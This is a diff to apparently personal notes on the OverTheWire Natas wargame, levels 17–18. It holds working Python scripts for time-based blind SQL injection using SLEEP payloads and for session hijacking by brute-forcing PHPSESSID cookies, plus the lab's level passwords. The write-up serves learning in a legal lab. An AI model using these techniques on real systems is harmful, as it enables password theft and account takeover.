@@ -2,6 +2,11 @@
 
 ### For serverside web security.
 
+[SQL injection payloads](https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b)
+
+Submitting on wechall:
+`WECHALLUSER="username" WECHALLTOKEN="token" wechall`
+
 Initial: 
 
 Username: natas0
@@ -683,3 +688,310 @@ No. It is server side.
 #### Observe responses of correct and incorrect queries?
 
 No difference. Everything seems same.
+
+#### What about time???
+
+Consider the SLEEP() [SQL attack vector](https://blog.pythian.com/mysql-injection-sleep/). 
+
+```py
+def analyse_time():
+    password = ""
+    character_set = "0123456789abcdefghijklmnopqrstuvwxyz"
+    for _ in range(32):
+        for char in character_set:
+            lower = char.lower()
+            _payload = {'username' : 'natas18" and if (password LIKE BINARY "'+password+lower+'%", SLEEP(5), 0) #'}
+            response = receive_response(_payload)
+            response_time = str(response.elapsed)
+            dot_index = response_time.index(".")
+            response_time = response_time[0:dot_index]
+            try:
+                last_index = len(response_time)
+                response_time_seconds = int(response_time[last_index-1:last_index])
+                if(response_time_seconds >= 5):
+                    password = password + lower
+                    print(password)
+            except:
+                pass
+
+            upper = char.upper()
+            _payload = {'username':'natas18" and if (password LIKE BINARY "'+password+upper+'%", SLEEP(5), 0) #'}
+            response = receive_response(_payload)
+            response_time = str(response.elapsed)
+            dot_index = response_time.index(".")
+            response_time = response_time[0:dot_index]
+            try:
+                last_index = len(response_time)
+                response_time_seconds = int(response_time[last_index-1:last_index])
+                if(response_time_seconds >= 5):
+                    password = password + upper
+                    print(password)
+            except:
+                pass
+    print(password)
+
+
+analyse_time()
+```
+
+Looking at the PHP code:
+
+```php
+if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    } 
+```
+
+All lines are commented out, implying there is no way to know whether the query was successful or not. The only way is to analyse other parts of the response. Here comes the timed SQL injection attack into the scene.
+
+```sql
+SELECT * FROM users WHERE username=""
+```
+
+If the username is set as `natas18" and password="" and ...`, then the AND logical operator works as if the first condition fails, then the second condition is checked. Our job here is to craft a condition such that the response takes long to return if we got certain condition true.
+
+```sql
+{ 'username' : 'natas18" and if (password LIKE BINARY "a%", SLEEP(5), 0) # }
+```
+
+Quite simply, if the first character of the password is `a`, then `SLEEP(5)`. For we just brute force our way such that we capture the first character in the password, then the second, and so on.
+
+```py
+def analyse_time():
+    password = ""
+    character_set = "0123456789abcdefghijklmnopqrstuvwxyz"
+    for _ in range(32):
+        for char in character_set:
+            lower = char.lower()
+            _payload = {'username' : 'natas18" and if (password LIKE BINARY "'+password+lower+'%", SLEEP(5), 0) #'}
+            response = receive_response(_payload)
+            response_time = str(response.elapsed)
+            dot_index = response_time.index(".")
+            response_time = response_time[0:dot_index]
+            try:
+                last_index = len(response_time)
+                response_time_seconds = int(response_time[last_index-1:last_index])
+                if(response_time_seconds >= 5):
+                    password = password + lower
+                    print(password)
+            except:
+                pass
+
+            upper = char.upper()
+            _payload = {'username':'natas18" and if (password LIKE BINARY "'+password+upper+'%", SLEEP(5), 0) #'}
+            response = receive_response(_payload)
+            response_time = str(response.elapsed)
+            dot_index = response_time.index(".")
+            response_time = response_time[0:dot_index]
+            try:
+                last_index = len(response_time)
+                response_time_seconds = int(response_time[last_index-1:last_index])
+                if(response_time_seconds >= 5):
+                    password = password + upper
+                    print(password)
+            except:
+                pass
+    print(password)
+
+
+analyse_time()
+```
+
+A better solution is [here](https://www.abatchy.com/2016/12/natas-level-17). It is like taking out the characters which are present in the password and running the above loop only on them. Testing for such characters occurs 
+
+Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+# Level 18
+
+## PHP session hijacking
+
+URL: http://natas18.natas.labs.overthewire.org/
+
+Viewing the source-code, the most interesting portions are:
+
+```php
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+}  
+```
+
+We have the following information here:
+
+1. Session IDs range from 1 to 640
+
+2. Logging with `admin` and `admin` as username and password won't work (see `isValidAdminLogin()`)
+
+3. Session starts successfully if there is `PHPSESSID` in `$_COOKIE`
+
+4. Credentials are printed if and only if `$_SESSION["admin"] ==1` (and there is no way to set this superglobal value from the client side).
+
+Since we can't set `$_SESSION["admin"] ==1` from the client side, our only attack vector is to impersonate an already taken `PHPSESSID`. One of these would be the admin's. And since `PHPSESSID` is taken from cookies, we hijack the cookies.
+
+Consider the following:
+
+```py
+auth_username = 'natas18'
+
+auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+
+_payload = {'username':'admin', 'password':'admin'}
+
+response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
+
+response = requests.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
+
+response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
+```
+
+The response obtained is:
+
+```s
+Please login ....
+
+You are logged in as a regular user ...
+
+Please login
+```
+
+while the following code:
+
+```py
+sess = requests.Session()
+
+auth_username = 'natas18'
+
+auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+
+_payload = {'username':'admin', 'password':'admin'}
+
+response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
+
+response = sess.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
+
+response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
+```
+
+```s
+Please login ....
+
+You are logged in as a regular user ...
+
+You are logged in as a regular user ...
+```
+
+In the second example, we have cookie persistance because of the opened session. This is our entry into session hijacking.
+
+```py
+def session_handling():
+    
+    sess = requests.Session()
+
+    auth_username = 'natas18'
+
+    auth_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+
+    _payload = {'username':'nimish', 'password':'nimish'}
+    
+
+    response = sess.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password), data= _payload)
+    
+    for i in range(1, 461):
+        new_cookie = RequestsCookieJar()
+
+        new_cookie.set(name="PHPSESSID", value=str(i), domain='natas18.natas.labs.overthewire.org', path="/")
+
+        sess.cookies.update(new_cookie)
+
+        response = sess.get('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth(auth_username, auth_password))
+
+        try:
+
+            response.text.index("are logged in as a regular")
+
+            print(str(i) + " non admin account")
+        
+        except:
+        
+            print(str(i) + " admin account ")
+        
+            print(response.text)
+        
+            break
+```
+Quite straightforward, we have a `sess.post()` to let the server give a `PHPSESSID`. We then update our cookie to impersonate all possible IDs. Once we get a response which is not of a regular user, we get the password. I got the break for `PHPSESSID=119`.
+
+Simple `GET` like `.../index.php?PHPSESSID=119` don't work. I guess because the cookies are not modified.
+
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
